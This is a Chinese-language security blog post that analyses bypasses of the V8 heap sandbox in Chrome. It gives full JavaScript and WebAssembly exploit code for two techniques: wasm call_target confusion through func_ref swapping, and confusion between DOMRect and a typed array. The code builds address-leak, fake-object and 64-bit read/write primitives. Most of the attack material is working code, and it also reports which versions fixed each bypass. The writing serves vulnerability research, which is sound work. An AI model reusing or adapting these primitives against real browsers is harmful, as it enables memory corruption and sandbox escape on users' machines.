---
slug: tiangongarticle048
date: 2024-10-09
title: V8堆沙箱绕过方法分析总结
author: Anansi
tags: ["沙箱", "绕过"]
---

## 一、What is Sandbox

沙箱机制（Sandboxing）是一种安全技术，用来隔离运行中的应用程序或代码，使其在受限的环境中执行。这种机制的目的是限制应用程序或代码与系统资源（如文件系统、网络、硬件）的直接交互，从而防止恶意软件或不受信任的代码造成安全威胁或数据泄露。

当提到chrome沙箱时通常会想到的是用于限制应用程序或代码与系统资源的直接交互的沙箱，而在实际的漏洞利用层面内存安全仍然是一个重要问题，在众多chrome可利用的漏洞中，v8漏洞可以说占到大多数，而V8漏洞很少是"经典"的内存损坏错误（释放后使用、越界访问等），而是微妙的逻辑问题，反过来再利用这些问题来损坏内存。因此，现有的内存安全解决方案在很大程度上并不适用于V8，于是在此背景下衍生出了v8 Sandbox。本文主要对v8 sandbox的一些绕过方法进行汇总分析。

## 二、V8 Sandbox

V8沙箱是一个基于软件的沙箱，其背后的基本思想是隔离 V8堆内存，使任何内存损坏都不会"扩散"到进程内存的其他部分，从而增加v8漏洞的利用难度。具体实现方式有两种： 第一种，如果buffer位于沙盒内，就将40位的地址偏移左移24位后得到的64位结果写入相应字段地址中：

* disable sandbox：

 ![](/attachments/2024-10-09-v8-sandbox-bypass//e90e04de-6860-4c6a-9367-4ef01c0206f3.png)

 ![](/attachments/2024-10-09-v8-sandbox-bypass//2a6c73e0-3f7b-4716-be39-f9b8115e767b.png)


* enable sandbox：

 ![](/attachments/2024-10-09-v8-sandbox-bypass//a8715aec-772d-41c5-a1d8-1308f570525c.png)

 ![](/attachments/2024-10-09-v8-sandbox-bypass//48969bf5-c52a-491a-ab66-5759b024687c.png)

通过对%DebugPrint具体的实现代码下断，可以找到具体的decode过程，首先从指定字段地址出得到64位值(`sandboxed_pointer`)，再将`sandboxed_pointer`右移24位(`kSandboxedPointerShift`)得到偏移(`offset`)，最后将`offset`与基址(`cage_base`)相加得到真实的地址指针：

 ![](/attachments/2024-10-09-v8-sandbox-bypass//1688cebf-2746-430f-a890-fd7afd185d2d.png)

第二种，如果buffer位于沙盒外，则会将指定字段地址内的值作为索引，通过指针表间接的引用buffer：

 ![](/attachments/2024-10-09-v8-sandbox-bypass//394d3c0e-0d8c-4ee3-a0fd-fea0889d2b61.png)

例如blink对象，在v8中所有的blink对象都分配在v8堆外，并以api对象的形式在v8中表示：

 ![](/attachments/2024-10-09-v8-sandbox-bypass//b90ad16e-9a3b-4691-bfc3-733bb67bda60.png)

V8 api对象实际上是blink对象的包装器，其中`embedder fields`字段存储内容用实际为一个表索引，此索引位置保存着对应的blink对象的实际地址及其类型：

 ![](/attachments/2024-10-09-v8-sandbox-bypass//9fc4014a-5f4b-427d-b746-779b91f8692b.png)

同样也可以通过对%DebugPrint实现下断找到具体的decode过程：

 ![](/attachments/2024-10-09-v8-sandbox-bypass//f38e8a5f-3f5b-4e56-8b96-f7b97fca0ed1.png)

 ![](/attachments/2024-10-09-v8-sandbox-bypass//e9e87752-2611-4fa3-aaf6-bfb92ff0d6f5.png)

## 三、V8 Sandbox Breaking

### 3.1 signature confusion breaking sandbox

在V8 webassembly中，wasm模块导出函数主要由函数签名(signature)和函数实现(call_target)组成，假设有以下代码，此代码可以导出`read_0`与`read_1`两个函数：

```js
(module
	(memory 1)
	(func $read_0 (export "read_0")  
		(param $offset i32)
		(result i64)  
		(i64.load  
			(local.get $offset)
		)  
	)  
	(func $read_1 (export "read_1")  
		(param $var1 i64)  
		(result i64)  
		i64.const 0  
	)  
）
```

在js代码中使用`read_0(0x41)`触发对`read_0`函数的调用，然后对`Builtins_JSToWasmWrapper`下断可以得到`signature`与`call_target`的获取过程：


1. 先通过函数对象获取`shared_info`字段，其中r14寄存器存的一直都是基地址，而rdi则是函数对象地址：

 ![](/attachments/2024-10-09-v8-sandbox-bypass//9511bc64-80b9-406b-ae27-a7ee66803d83.png)

 ![](/attachments/2024-10-09-v8-sandbox-bypass//331126f7-87f9-4814-b5ba-511d4d6bf7c1.png)


2. 通过`shared_info`字段得到`function_data`：

 ![](/attachments/2024-10-09-v8-sandbox-bypass//833bffd0-5833-48c1-a925-d18eb2d4ba93.png)

 ![](/attachments/2024-10-09-v8-sandbox-bypass//ad27e0a6-65c0-4f20-bcf4-f738910f420b.png)


3. 通过`function_data`获取`signature`，`signature`对象不在沙盒中，所以是通过外部表的形式间接引用的，所以此处得到的是一个表索引：

 ![](/attachments/2024-10-09-v8-sandbox-bypass//96cc7d7d-4241-4d42-8c16-00a0bbdf3c3d.png)

 ![](/attachments/2024-10-09-v8-sandbox-bypass//0e98c20f-ba5d-4614-a8b8-6a4dec1d7fca.png)


4. 通过`function_data`获取`func_ref`：

    ![](/attachments/2024-10-09-v8-sandbox-bypass//2346174f-e21d-497d-8bf3-1b30ae6fd1e4.png)

    ![](/attachments/2024-10-09-v8-sandbox-bypass//fc5d6168-9f27-4670-b1d7-1ba8c092f56d.png)

通过`func_ref`可以得到`internal`，`internal`是一个外部对象，而`call_target`就在`internal`中并且也是一个外部对象，所以都只能得到一个表索引：

 ![](/attachments/2024-10-09-v8-sandbox-bypass//5654e37c-00f5-451d-9b65-5029e998499b.png)

 ![](/attachments/2024-10-09-v8-sandbox-bypass//8bbb5d05-dbdd-4caa-90b9-d4a7413b3fa8.png)

 ![](/attachments/2024-10-09-v8-sandbox-bypass//b411540b-67ca-4835-931d-846dfec938b1.png)

最后`Builtins_JSToWasmWrapperAsm`函数会通过`call rdx`进入`call_target`指向的地址，在通过几个Jmp后会进入真实的jited代码，rax为传入的地址偏移：

 ![](/attachments/2024-10-09-v8-sandbox-bypass//7da5a077-2773-4e84-a292-9721a45d8ca2.png)

总结整个获取过程大致就是：`function -> shared_info -> function_data -> func_ref -> internal -> call_target`

通过调试会发现`signature`与`call_target`并没有太多的联系，而wasm导出函数的参数类型，及其后面的返回值类型声明列表由signature来决定，而对类型的检查也是在builtins函数中，所以在调用`call_target`时会直接将参数传入：

 ![](/attachments/2024-10-09-v8-sandbox-bypass//f90f4bde-8eb7-4ea3-ba8b-27e793e333e2.png)

所以如果将`read_0`与`read_1`的`call_target`进行混淆那在调用`read_1`函数时就可以实现64位地址空间的读取，在前面的分析中可知`call_target`是沙盒外对象，所以只能得到一个表索引无法直接读取到`call_target`对象地址，不过`func_ref`在沙盒内，可以直接将`read_0`的`func_ref`写入`read_1`。

还有一个问题，那就是`read_0`的`call_target`代码在从内存中读取内容时还会与rcx也就是`（memory 1)`代码中申请的线性内存地址的基址相加，这个线性内存地址实际为一个arraybuffer对象的backing_store：

 ![](/attachments/2024-10-09-v8-sandbox-bypass//0042f310-2653-4855-8078-b42df25d005b.png)

通过前面第一章对JSArrayBuffer `backing_store`对象的说明，可以提前得到rcx中的值，当然得到的是其偏移地址，而基地址可以用Uint32Array对象来泄露，用泄露出的基地址加偏移地址就可以得到真实的`backing_store`地址，现在用我们要读写的64位地址减去`backing_store`地址，再将结果传入对应的读写函数就可以实现64位地址空间读写。 为方便解释，以下所有代码示例将通过sandbox对象来实现双数组混淆来实现读写原语的构造，此对象主要用对沙箱的测试，在稳定版中不可用，官方说明：[V8 Sandbox - Readme (googlesource.com)](https://chromium.googlesource.com/v8/v8.git/+/refs/heads/main/src/sandbox/README.md)。 以下wasm代码与开头的类似，为了方便构造写原语我又添加了`oob_write`与`do_write`函数:

```js
/*
(module
  (memory (export "wmemory") 1) ;;64KB memory chunk

  (func $oob_write (export "oob_write")
    (param $var1 i64)
    (param $var2 i64)
    nop
  )

  (func $oob_read (export "oob_read")
    (param $var1 i64)
	(result i64)
	i64.const 0
  )

  (func $do_write (export "do_write")
    (param $offset i32)  ;; Offset within memory
    (param $value i64)   ;; 64-bit integer to write
    (i64.store
      (local.get $offset)  ;; Get the memory offset
      (local.get $value)   ;; Get the i64 value
    )
  )

  (func $do_read (export "do_read")
    (param $offset i32)  ;; Offset within memory
	(result i64)
    (i64.load
      (local.get $offset)  ;; Get the memory offset
    )
  )
)
*/
```

之后将转换为二进制数的wasm代码放入数组中，以便于将函数导入到js代码中调用：

```js

const u32array = new Uint32Array([1.1, 2.2, 3.3]);
var wasm_code = new Uint8Array([
  0x00, 0x61, 0x73, 0x6D, 0x01, 0x00, 0x00, 0x00, 0x01, 0x15, 0x04, 0x60, 0x02, 0x7E, 0x7E, 0x00,
  0x60, 0x01, 0x7E, 0x01, 0x7E, 0x60, 0x02, 0x7F, 0x7E, 0x00, 0x60, 0x01, 0x7F, 0x01, 0x7E, 0x03,
  0x05, 0x04, 0x00, 0x01, 0x02, 0x03, 0x05, 0x03, 0x01, 0x00, 0x01, 0x07, 0x37, 0x05, 0x07, 0x77,
  0x6D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x02, 0x00, 0x09, 0x6F, 0x6F, 0x62, 0x5F, 0x77, 0x72, 0x69,
  0x74, 0x65, 0x00, 0x00, 0x08, 0x6F, 0x6F, 0x62, 0x5F, 0x72, 0x65, 0x61, 0x64, 0x00, 0x01, 0x08,
  0x64, 0x6F, 0x5F, 0x77, 0x72, 0x69, 0x74, 0x65, 0x00, 0x02, 0x07, 0x64, 0x6F, 0x5F, 0x72, 0x65,
  0x61, 0x64, 0x00, 0x03, 0x0A, 0x1C, 0x04, 0x03, 0x00, 0x01, 0x0B, 0x04, 0x00, 0x42, 0x00, 0x0B,
  0x09, 0x00, 0x20, 0x00, 0x20, 0x01, 0x37, 0x03, 0x00, 0x0B, 0x07, 0x00, 0x20, 0x00, 0x29, 0x03,
  0x00, 0x0B 
]);
var wasm_mod = new WebAssembly.Module(wasm_code);
var wasm_instance = new WebAssembly.Instance(wasm_mod);
var {wmemory, oob_read, oob_write, do_read, do_write} = wasm_instance.exports;
```

然后利用sandbox对象来完成双数组混淆，具体做法就是直接去修改数组`d_arr`的长度字段，将其长度修改为0x1000，此时`d_arr`就可以去读写`o_arr`数组中保存的数据内容：

```js

class Utils{
	// ...
}
const utils = new Utils();

const sbxMem = new Sandbox.MemoryView(0, 0xFFFFFFF8);
const sbxDV = new DataView(sbxMem);
let f_arr = [2.1, 2.2];
let d_arr = [1.1, 1.2];
let o_arr = [1, 2, 3, {}];
const d_arr_len = Sandbox.getAddressOf(d_arr)+0xC;
sbxDV.setUint32(d_arr_len, 0x1000, true);
```

在得到两个混淆的不同类型的数组后就可以像其他v8漏洞那样构造地址泄露函数：

```js

function leak_addr(obj){
  o_arr[0] = obj;
  return utils.ftoi(d_arr[5]) & 0xFFFFFFFFn;
}
```

此时我们就可以着手准备构造任意地址读写原语了，首先通过混淆数组得到double型数组的map，随后在一个新的double型数组`f_arr`中伪造一个假的double数组`fake_obj`，之后我们就可以通过`f_arr`去控制`fake_obj`的elements地址，但要注意的是因为堆沙箱的存在，被填入的elements地址将被限制在堆沙箱内存区域内：

```js

function limit_read(addr){
  set_elements(addr, 0x2n);
  return utils.ftoi(fake_obj[0]);
}

function limit_write(addr, val){
  set_elements(addr, 0x2n);
  fake_obj[0] = utils.itof(val);
}

function get_map(){
  return utils.ftoi(d_arr[2]);
}

function get_fake_obj(){
  const f_map = get_map();
  f_arr[0] = utils.itof(f_map);
  set_elements(0x4141n, 0x2n);
  const f_arr_addr = leak_addr(f_arr);
  const f_elem_addr = f_arr_addr - 0x18n;
  const f_obj_addr = f_elem_addr + 0x8n;
  d_arr[5] = utils.itof(f_obj_addr);
  return o_arr[0];
}

function set_elements(addr, len){
  f_arr[1] = utils.itof(utils.pair(len, addr));
}

let fake_obj = get_fake_obj();
```

在得到读写原语与地址泄露函数后就可以通过上文中提到的方法去混淆`call_target`了：

```js

function replace_func_ref(){
  do_read(0);
  do_write(0, 0n);
  oob_read(0n);
  oob_write(0n, 0n);
  // get function address
  const do_read_addr = leak_addr(do_read);
  const do_write_addr = leak_addr(do_write);
  const oob_read_addr = leak_addr(oob_read);
  const oob_write_addr = leak_addr(oob_write);
  // get function share_info
  const dr_share_info = 
    limit_read(do_read_addr+0x8n)   & 0xFFFFFFFFn;
  const dw_share_info = 
    limit_read(do_write_addr+0x8n)  & 0xFFFFFFFFn;
  const or_share_info = 
    limit_read(oob_read_addr+0x8n)  & 0xFFFFFFFFn;
  const ow_share_info = 
    limit_read(oob_write_addr+0x8n) & 0xFFFFFFFFn;
  // get function_data
  const dr_function_data = 
    limit_read(dr_share_info) & 0xFFFFFFFFn;
  const dw_function_data = 
    limit_read(dw_share_info) & 0xFFFFFFFFn;
  const or_function_data = 
    limit_read(or_share_info) & 0xFFFFFFFFn;
  const ow_function_data = 
    limit_read(ow_share_info) & 0xFFFFFFFFn;
  // get func_ref
  const or_func_ref = 
    limit_read(or_function_data) & 0xFFFFFFFFn;
  const ow_func_ref = 
    limit_read(ow_function_data) & 0xFFFFFFFFn;
  const dr_func_ref = 
    limit_read(dr_function_data) & 0xFFFFFFFFn;
  const dw_func_ref = 
    limit_read(dw_function_data) & 0xFFFFFFFFn;
  limit_write(or_function_data, dr_func_ref);
  limit_write(ow_function_data, dw_func_ref);
}
```

最后要注意的是，`oob_write`函数在向内存中写入数据时还会将传入的目标地址与wmemory堆地址相加，所以为了确保写入的地址正确，我们还需要得到wmemory堆地址，并用要写入的目标地址减去wmemory堆地址，这样在写入时就可以写入到正确的目标地址：

```js

function get_heap_base(){
  const u32array_addr = leak_addr(u32array);
  limit_write(u32array_addr+(0x30n-0x8n), 0x0n);
  limit_write(u32array_addr+(0x38n-0x8n), 0x0n);

  limit_write(u32array_addr+(0x24n-0x8n), 0x15n);
  limit_write(u32array_addr+(0x2Cn-0x8n), 0x15n);

  const base = u32array[0x13];
  return BigInt(base)<<0x20n;
}

function get_wasm_mem(base){
  const addr = leak_addr(wmemory);
  const buffer_addr = 
    limit_read(addr+(0xCn-0x8n)) & 0xFFFFFFFFn;
  const offset_l = 
    limit_read(buffer_addr+(0x24n-0x8n)) & 0xFFFFFFFFn;
  const offset_h = 
    limit_read(buffer_addr+(0x28n-0x8n)) & 0xFFFFFFFFn;
  const offset = 
    ((BigInt(offset_h)<<0x20n) + offset_l) >> 0x18n;
  const bk_addr = base + offset;
  return bk_addr;
}

const js_heap_base = get_heap_base();
const backing_store_addr = get_wasm_mem(js_heap_base);
replace_func_ref();
const target_page = BigInt(Sandbox.targetPage);
const address = target_page - backing_store_addr;
print("[*]target_page:"+target_page.toString(16));
oob_write(address, 0x9n);
```

 ![](/attachments/2024-10-09-v8-sandbox-bypass//da8f6f23-38cd-4470-ab29-c25c2cb47da1.png)

 ![](/attachments/2024-10-09-v8-sandbox-bypass//37815cd8-0433-4633-ba64-338a1b62e3a0.png)

\n ![](img/26.png) 此方法在chrome 126版本之后修复，在修复程序中添加了新的`IsAccessedMemoryCovered`函数：

 ![](/attachments/2024-10-09-v8-sandbox-bypass//06b13952-cf1b-4d21-9a1c-371f9def5d15.jpeg)

此函数先回检查目标地址是否为空，如果不是将会检查访问的目标地址是否位于沙盒内。`gV8SandboxBase`与`gV8SandboxSize`也是新添加的内容，`gV8SandboxBase`为沙盒区域的基地址，`gV8SandboxSize`则是沙盒区域的大小。

### 3.2 blink object confusion breaking sandbox

一开始提到在v8中所有的blink对象都以外部指针表索引的形式被v8 api对象所引用，虽然外部指针表受到保护无法篡改里面的内容，但是api对象是在堆中，可以篡改api对象中的`embedder fields`字段，使两个blink对象产生混淆，比如将`DOMRect` 与 `DOMTypedArray` 混淆。

`DOMRect` 对象只有四个属性：`x`、`y`、`width`、`height`，访问这些属性本质上只是对相应对象的指定偏移进行读写，如果`DOMRect` 与 `DOMTypedArray` 发生了混淆，那就可以通过`DOMRect` 中的属性字段自由控制`DOMTypedArray`对象的`backing_store`指针，该指针用于指向`DOMTypedArray`实际的数据存储区域，可以将此指针覆盖修改为其他任意64位地址指针从而实现64位地址空间读写。 先创建要被混淆的`DOMRect` 与 `DOMTypedArray`：

```js

const domRect = new DOMRect(1.1,2.3,3.3,4.4);
const node = 
	new AudioBuffer({
		length: 3000, 
		sampleRate: 30000, 
		numberOfChannels : 2
	});
const channel = node.getChannelData(0);
```

此处与上一种方法相同，同样使用sandbox构造堆读写原语，不再进行说明：

```js

const sbxMem = new Sandbox.MemoryView(0, 0xFFFFFFF8);
const sbxDV = new DataView(sbxMem);
let f_arr = [2.1, 2.2];
let d_arr = [1.1, 1.2];
let o_arr = [1, 2, 3, {}];
const d_arr_len = Sandbox.getAddressOf(d_arr)+0xC;
sbxDV.setUint32(d_arr_len, 0x1000, true);

function leak_addr(obj){
  o_arr[0] = obj;
  return utils.ftoi(d_arr[5]) & 0xFFFFFFFFn;
}

function limit_read(addr){
  set_elements(addr, 0x2n);
  return utils.ftoi(fake_obj[0]);
}

function limit_write(addr, val){
  set_elements(addr, 0x2n);
  fake_obj[0] = utils.itof(val);
}

function get_map(){
  return utils.ftoi(d_arr[2]);
}

function get_fake_obj(){
  const f_map = get_map();
  f_arr[0] = utils.itof(f_map);
  set_elements(0x4141n, 0x2n);
  const f_arr_addr = leak_addr(f_arr);
  const f_elem_addr = f_arr_addr - 0x18n;
  const f_obj_addr = f_elem_addr + 0x8n;
  d_arr[5] = utils.itof(f_obj_addr);
  return o_arr[0];
}

function set_elements(addr, len){
  f_arr[1] = utils.itof(utils.pair(len, addr));
}
```

最后将`DOMRect` 与 `DOMTypedArray` 进行混淆：

```js

function get_embedder_fields(addr, offset){
	let ret = [];
	let res = limit_read(addr+offset);
	ret[0] = res & 0xFFFFFFFFn
	ret[1] = (res & 0xFFFFFFFF00000000n) >> 0x20n;
	return ret;
}

function confusion_embedder(addr, offset, ef){
	limit_write(addr+offset, ef[0]);
	limit_write(addr+offset+0x8n, ef[1]);
}

let fake_obj = get_fake_obj();
const DOMRECT_EMBEDDER_OFFSET = 0x10n;
const CHANNEL_EMBEDDER_OFFSET = 0x3Cn

const domRect_addr = leak_addr(domRect);
const channel_addr = leak_addr(channel);
const channel_ef = get_embedder_fields(
	channel_addr, CHANNEL_EMBEDDER_OFFSET);
const target_page = BigInt(Sandbox.targetPage);

confusion_embedder(
	domRect_addr, 
	DOMRECT_EMBEDDER_OFFSET, 
	channel_ef);
domRect.x = utils.itof(target_page);
const view = new ArrayBuffer(24);
const src = new Float32Array(view);
src[0] = 9.999;
node.copyToChannel(src, 0, 0);
```

此方法至少在chrome 126版本之前都可用。

## 四、Conclusion

尽管 V8 引擎在其设计中引入了沙箱机制以增强安全性，但攻击者仍然能够通过复杂的对象混淆和内存操控来打破沙箱的边界。因此，在未来的安全研究中，如何更好地隔离这些敏感数据对象以及如何进一步优化沙箱设计将成为研究重点。